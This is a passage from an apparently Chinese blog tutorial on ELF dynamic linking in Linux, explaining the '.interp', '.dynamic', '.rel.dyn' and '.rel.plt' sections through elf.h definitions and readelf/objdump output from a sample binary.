Linker)</code></strong>。</p><p>&emsp;&emsp;在<code>Linux</code>下，<strong><code>动态链接器ld.so</code></strong>实际上是一个<code>共享对象</code>，操作系统同样通过<code>映射的方式</code>将它加载到<code>进程的地址空间</code>中。操作系统在<code>加载完动态链接器</code>之后，就将控制权交给<code>动态链接器的入口地址</code>（与可执行文件一样，共享对象也有入口地址）。当<code>动态链接器</code>得到<code>控制权</code>之后，它开始执行一系列<code>自身的初始化</code>操作，然后根据当前的<code>环境参数</code>，开始对<code>可执行文件</code>进行<code>动态链接工作</code>。当所有<code>动态链接工作</code>完成以后，<code>动态链接器</code>会将<code>控制权</code>转交到<code>可执行文件的入口地址</code>，程序开始正式执行。[<a href="#Ref1">1</a>]</p><h3 id="2-0、标准ELF变量类型"><a href="#2-0、标准ELF变量类型" class="headerlink" title="2.0、标准ELF变量类型"></a>2.0、标准ELF变量类型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Standard ELF types.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type for a 16-bit quantity.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf32_Half;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf64_Half;</span><br><span class="line"><span class="comment">/* Types for signed and unsigned 32-bit quantities.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>  Elf32_Sword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf64_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>  Elf64_Sword;</span><br><span class="line"><span class="comment">/* Types for signed and unsigned 64-bit quantities.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf32_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span>  Elf32_Sxword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span>  Elf64_Sxword;</span><br><span class="line"><span class="comment">/* Type of addresses.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="comment">/* Type of file offsets.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Off;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Off;</span><br><span class="line"><span class="comment">/* Type for section indices, which are 16-bit quantities.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf32_Section;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf64_Section;</span><br><span class="line"><span class="comment">/* Type for version symbol information.  */</span></span><br><span class="line"><span class="keyword">typedef</span> Elf32_Half Elf32_Versym;</span><br><span class="line"><span class="keyword">typedef</span> Elf64_Half Elf64_Versym;</span><br></pre></td></tr></table></figure><h3 id="2-1、“-interp”段"><a href="#2-1、“-interp”段" class="headerlink" title="2.1、“.interp”段"></a>2.1、“.interp”段</h3><p>&emsp;&emsp;<code>动态链接器的位置</code>既不是由<code>系统配置</code>指定，也不是由<code>环境参数</code>决定，而是由<code>ELF可执行文件</code>决定。在<code>动态链接</code>的<code>ELF可执行文件</code>中，有一个专门的段叫做<strong><code>“.interp”</code></strong>段（“interp”是“interpreter”（解释器）的缩写）。如果我们使用<code>objdump</code>工具来查看，可以看到“.interp”内容：[<a href="#Ref1">1</a>]<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s pwn200</span><br><span class="line"></span><br><span class="line">pwn200:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .interp:</span><br><span class="line"> 8048134 2f6c6962 2f6c642d 6c696e75 782e736f  /lib/ld-linux.so</span><br><span class="line"> 8048144 2e3200                               .2.</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<strong><code>“.interp”</code></strong>的内容很简单，里面保存的就是<code>一个字符串</code>，这个字符串就是<code>可执行文件</code>所需要的<code>动态链接器的路径</code>，在<code>Linux</code>下，可执行文件所需要的动态链接器的路径几乎都是<code>“/lib/ld-linux.so.2”</code>，其他的<code>*nix操作系统</code>可能会有不同的路径。在<code>Linux</code>的系统中，<code>/lib/ld-linux.so.2</code>通常是一个<code>软链接</code>，比如在我的机器上，它指向<code>/lib/ld-2.6.1.so</code>，这个才是真正的动态链接器。在Linux中，操作系统在对可执行文件的进行加载的时候，它会去寻找装载该可执行文件所需要相应的动态链接器，即<code>“.interp”</code>段指定的路径的<code>共享对象</code>。</p><p>&emsp;&emsp;<code>动态链接器</code>在Linux下是<code>Glibc的一部分</code>，也就是属于<code>系统库级别</code>的，它的<code>版本号</code>往往跟系统中的<code>Glibc库版本号</code>是一样的，比如我的系统中安装的是<code>Glibc 2.6.1</code>，那么相应的<code>动态链接器</code>也就是<code>/lib/ld-2.6.1.so</code>。当系统中的<code>Glibc库更新</code>或者安装<code>其他版本</code>的时候，<code>/lib/ld-linux.so.2</code>这个<code>软链接</code>就会指向到<code>新的动态链接器</code>，而<code>可执行文件</code>本身不需要修改<code>“.interp”</code>中的<code>动态链接器路径</code>来适应系统的升级。</p><p>&emsp;&emsp;我们也可以用这个命令来查看一个<code>可执行文件</code>所需要的<code>动态链接器的路径</code>，在Linux下，往往是如下结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l a.out | grep interpreter</span><br><span class="line">      [Requesting program interpreter: /lib/ld-linux.so.2]</span><br></pre></td></tr></table></figure></p><p>而当我们在<code>FreeBSD 4.6.2</code>下执行这个命令时，结果是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l a.out | grep interpreter</span><br><span class="line">     [Requesting program interpreter: /usr/libexec/ld-elf.so.1]</span><br></pre></td></tr></table></figure></p><p><code>64位的Linux</code>下的可执行文件是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l a.out | grep interpreter</span><br><span class="line">     [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]</span><br></pre></td></tr></table></figure></p><h3 id="2-2、“-dynamic”段"><a href="#2-2、“-dynamic”段" class="headerlink" title="2.2、“.dynamic”段"></a>2.2、“.dynamic”段</h3><p>&emsp;&emsp;类似于<code>“.interp”</code>这样的段，ELF中还有几个段也是<code>专门用于动态链接</code>的，比如<code>“.dynamic”段</code>和<code>“.dynsym”段</code>等。要了解<code>动态链接器</code>如何完成<code>链接过程</code>，跟前面一样，从了解<code>ELF文件</code>中跟<code>动态链接相关的结构</code>入手将会是一个很好的途径。ELF文件中跟动态链接相关的段有好几个，相互之间的关系也比较复杂，我们先从<code>“.dynamic”段</code>入手。</p><p>&emsp;&emsp;动态链接ELF中<code>最重要的结构</code>应该是<strong><code>“.dynamic”段</code></strong>，这个段里面保存了<code>动态链接器</code>所需要的<code>基本信息</code>，比如依赖于哪些<code>共享对象</code>、<code>动态链接符号表</code>的位置、<code>动态链接重定位表</code>的位置、<code>共享对象初始化代码</code>的地址等。<code>“.dynamic”段的结构</code>很经典，就是我们已经碰到过的ELF中眼熟的<code>结构数组</code>，结构定义在<code>“elf.h”</code>中：[<a href="#Ref3">3</a>]<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Sxword d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf64_Xword d_val;  </span><br><span class="line">        Elf64_Addr d_ptr;    </span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>Elf32_Dyn</code>结构由一个<code>类型值</code>加上一个附加的<code>数值</code>或<code>指针</code>，对于<code>不同的类型</code>，后面附加的<code>数值</code>或者<code>指针</code>有着<code>不同的含义</code>。我们这里列举几个比较<code>常见的类型值</code>(这些值都是定义在<code>“elf.h”里面的宏</code>)，如下表所示：[<a href="#Ref3">3</a>]</p><table><thead><tr><th style="text-align:left">d_tag类型</th><th style="text-align:left">d_un的含义</th></tr></thead><tbody><tr><td style="text-align:left">DT_NEEDED</td><td style="text-align:left">ELF所依赖的共享库文件名，d_val表示共享库文件名在“.dynstr”表中的偏移</td></tr><tr><td style="text-align:left">DT_INIT</td><td style="text-align:left">d_ptr表示init函数地址</td></tr><tr><td style="text-align:left">DT_INIT_ARRAY</td><td style="text-align:left">d_ptr表示有关初始化的函数的地址数组的地址</td></tr><tr><td style="text-align:left">DT_INIT_ARRAYSZ</td><td style="text-align:left">d_val表示DT_INIT_ARRAY数组的大小</td></tr><tr><td style="text-align:left">DT_FINI</td><td style="text-align:left">d_ptr表示fini函数地址</td></tr><tr><td style="text-align:left">DT_FINI_ARRAY</td><td style="text-align:left">d_ptr表示有关结束清理的函数的地址数组的地址</td></tr><tr><td style="text-align:left">DT_FINI_ARRAYSZ</td><td style="text-align:left">d_val表示DT_FINI_ARRAY数组的大小</td></tr><tr><td style="text-align:left">DT_HASH</td><td style="text-align:left">动态链接符号Hash表地址，d_ptr表示“.hash”的地址</td></tr><tr><td style="text-align:left">DT_GNU_HASH</td><td style="text-align:left">动态链接GNU风格的Hash表的地址，d_ptr表示“.gnu.hash”的地址</td></tr><tr><td style="text-align:left">DT_STRTAB</td><td style="text-align:left">动态链接字符串表的地址，d_ptr表示“.dynstr”的地址</td></tr><tr><td style="text-align:left">DT_STRSZ</td><td style="text-align:left">d_val表示动态链接字符串表“.dynstr”的大小</td></tr><tr><td style="text-align:left">DT_SYMTAB</td><td style="text-align:left">动态链接符号表的地址，d_ptr表示“.dynsym”的地址</td></tr><tr><td style="text-align:left">DT_SYMENT</td><td style="text-align:left">d_val表示动态链接符号表“.dynsym”中每一项的大小</td></tr><tr><td style="text-align:left">DT_PLTGOT</td><td style="text-align:left">d_ptr表示全局偏移表“.got.plt”地址。</td></tr><tr><td style="text-align:left">DT_PLTREL</td><td style="text-align:left">d_val表示动态链接重定位表的类型值“d_tag”，也就是DT_REL对应的值</td></tr><tr><td style="text-align:left">DT_PLTRELSZ</td><td style="text-align:left">d_val表示动态链接重定位表中函数重定位表“.rel.plt”的大小</td></tr><tr><td style="text-align:left">DT_JMPREL</td><td style="text-align:left">d_ptr表示动态链接重定位表中函数重定位表“.rel.plt”的地址</td></tr><tr><td style="text-align:left">DT_REL</td><td style="text-align:left">d_ptr表示动态链接重定位表的地址(ELF32)</td></tr><tr><td style="text-align:left">DT_RELSZ</td><td style="text-align:left">d_val表示动态链接重定位表中变量重定位表“.rel.dyn”的大小(ELF32)</td></tr><tr><td style="text-align:left">DT_RELENT</td><td style="text-align:left">d_val表示动态链接重定位表中每一项的大小(ELF32)</td></tr><tr><td style="text-align:left">DT_RELA</td><td style="text-align:left">d_ptr表示动态链接重定位表的地址(ELF64)</td></tr><tr><td style="text-align:left">DT_RELASZ</td><td style="text-align:left">d_val表示动态链接重定位表中变量重定位表“.rel.dyn”的大小(ELF64)</td></tr><tr><td style="text-align:left">DT_RELAENT</td><td style="text-align:left">d_val表示动态链接重定位表中每一项的大小(ELF64)</td></tr><tr><td style="text-align:left">DT_VERNEED</td><td style="text-align:left">d_ptr表示ELF文件所需要的库文件版本表的地址</td></tr><tr><td style="text-align:left">DT_VERNEEDNUM</td><td style="text-align:left">d_val表示ELF文件所需要的库文件版本表条目的数量</td></tr><tr><td style="text-align:left">DT_VERSYM</td><td style="text-align:left">d_ptr表示动态符号版本表“.gnu.version”的地址</td></tr><tr><td style="text-align:left">DT_SONAME</td><td style="text-align:left">d_val表示共享库名称</td></tr><tr><td style="text-align:left">DT_RPATH</td><td style="text-align:left">d_val表示库搜索路径（不建议使用）</td></tr><tr><td style="text-align:left">DT_NULL</td><td style="text-align:left">标记“.dynamic”段的结束</td></tr></tbody></table><p><strong><code>定义代码：</code></strong>[<a href="#Ref3">3</a>]<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NULL     0   <span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NEEDED   1   <span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTRELSZ 2   <span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTGOT   3   <span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HASH     4   <span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_STRTAB   5   <span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMTAB   6   <span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELA     7   <span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELASZ   8   <span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELAENT  9   <span class="comment">/* Size of one Rela reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_STRSZ    10  <span class="comment">/* Size of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMENT   11  <span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_INIT     12  <span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FINI     13  <span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SONAME   14  <span class="comment">/* Name of shared object */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RPATH    15  <span class="comment">/* Library search path (deprecated) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMBOLIC 16  <span class="comment">/* Start symbol search here */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_REL      17  <span class="comment">/* Address of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELSZ    18  <span class="comment">/* Total size of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELENT   19  <span class="comment">/* Size of one Rel reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTREL   20  <span class="comment">/* Type of reloc in PLT */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_DEBUG    21  <span class="comment">/* For debugging; unspecified */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_TEXTREL  22  <span class="comment">/* Reloc might modify .text */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_JMPREL   23  <span class="comment">/* Address of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_BIND_NOW 24  <span class="comment">/* Process relocations of object */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_INIT_ARRAY 25  <span class="comment">/* Array with addresses of init fct */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FINI_ARRAY 26  <span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_INIT_ARRAYSZ 27  <span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FINI_ARRAYSZ 28  <span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RUNPATH      29  <span class="comment">/* Library search path */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FLAGS        30  <span class="comment">/* Flags for the object being loaded */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_ENCODING     31  <span class="comment">/* Start of encoded range */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PREINIT_ARRAY 32  <span class="comment">/* Array with addresses of preinit fct*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PREINIT_ARRAYSZ 33  <span class="comment">/* size in bytes of DT_PREINIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMTAB_SHNDX    34  <span class="comment">/* Address of SYMTAB_SHNDX section */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NUM             35  <span class="comment">/* Number used */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_LOOS    0x6000000d  <span class="comment">/* Start of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HIOS    0x6ffff000  <span class="comment">/* End of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_LOPROC  0x70000000  <span class="comment">/* Start of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HIPROC  0x7fffffff  <span class="comment">/* End of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PROCNUM DT_MIPS_NUM  <span class="comment">/* Most used by any processor */</span></span></span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;上表中只列出了<code>一部分定义</code>，还有一些不太常用的定义我们就暂且忽略，具体可以参考<code>LSB手册</code>和<code>elf.h的定义</code>。从上面给出的这些定义来看，<code>“.dynamic”</code>段里面保存的信息有点像<code>ELF文件头</code>，只是我们前面看到的<code>ELF文件头</code>中保存的是<code>静态链接</code>时相关的内容，比如<code>静态链接</code>时用到的<code>符号表</code>、<code>重定位表</code>等，这里换成了<code>动态链接</code>下所使用的相应信息了。所以，<code>“.dynamic”</code>段可以看成是<code>动态链接</code>下<code>ELF文件的“文件头”</code>。使用<code>readelf</code>工具可以查看<code>“.dynamic”段</code>的内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d pwn200</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x750 contains 25 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8048328</span><br><span class="line"> 0x0000000d (FINI)                       0x8048650</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049744</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049748</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x00000004 (HASH)                       0x804818c</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481c0</span><br><span class="line"> 0x00000005 (STRTAB)                     0x8048260</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481e0</span><br><span class="line"> 0x0000000a (STRSZ)                      95 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x8049844</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   48 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x80482f8</span><br><span class="line"> 0x00000011 (REL)                        0x80482f0</span><br><span class="line"> 0x00000012 (RELSZ)                      8 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x80482d0</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x80482c0</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure></p><h3 id="2-3、“-rel-dyn”段和“-rel-plt”段"><a href="#2-3、“-rel-dyn”段和“-rel-plt”段" class="headerlink" title="2.3、“.rel.dyn”段和“.rel.plt”段"></a>2.3、“.rel.dyn”段和“.rel.plt”段</h3><p>&emsp;&emsp;我们可以使用<code>readelf</code>查看重定位表段：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r pwn200</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.dyn'</span> at offset 0x2f0 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049840  00000206 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.plt'</span> at offset 0x2f8 contains 6 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049850  00000107 R_386_JUMP_SLOT   00000000   <span class="built_in">read</span>@GLIBC_2.0</span><br><span class="line">08049854  00000207 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">08049858  00000307 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0</span><br><span class="line">0804985c  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">08049860  00000507 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br><span class="line">08049864  00000607 R_386_JUMP_SLOT   00000000   strncmp@GLIBC_2.0</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<strong><code>“.rel.dyn”</code></strong>实际上是对<code>数据引用</code>的修正，它所修正的位置位于<code>“.got”</code>以及<code>数据段</code>；而<strong><code>“.rel.plt”</code></strong>是对<code>函数引用</code>的修正，它所修正的位置位于<code>“.got.plt”</code>。<br>&emsp;&emsp;<code>32位</code>和<code>64位</code>ELF使用的<code>重定位表</code>有一点区别，但都是<code>结构体数组</code>。一般<code>32位</code>使用<strong><code>Elf32_Rel</code></strong>,<code>64位</code>使用<strong><code>Elf32_Rela</code></strong>。结构体定义如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset; <span class="comment">/* 表示重定位所作用的虚拟地址或相对基地址的偏移 */</span></span><br><span class="line">    Elf32_Word r_info;   <span class="comment">/* 重定位类型和符号表下标 */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Addr r_offset; <span class="comment">/* 表示重定位所作用的虚拟地址或相对基地址的偏移 */</span></span><br><span class="line">    Elf64_Xword r_info;  <span class="comment">/* 重定位类型和符号表下标 */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Relocation table entry with addend (in section of type SHT_RELA).  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;  <span class="comment">/* 表示重定位所作用的虚拟地址或相对基地址的偏移 */</span></span><br><span class="line">    Elf32_Word r_info;    <span class="comment">/* 重定位类型和符号表下标 */</span></span><br><span class="line">    Elf32_Sword r_addend; <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf32_Rela;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Addr r_offset;  <span class="comment">/* 表示重定位所作用的虚拟地址或相对基地址的偏移 */</span></span><br><span class="line">    Elf64_Xword r_info;   <span class="comment">/* 重定位类型和符号表下标 */</span></span><br><span class="line">    Elf64_Sxword r_addend; <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="comment">//获得高24位，表示在符号表中的下标</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(val)  ((val) &gt;&gt; 8) </span></span><br><span class="line"><span class="comment">//获得低8位，表示重定位类型</span></span><br><span class="line"><span 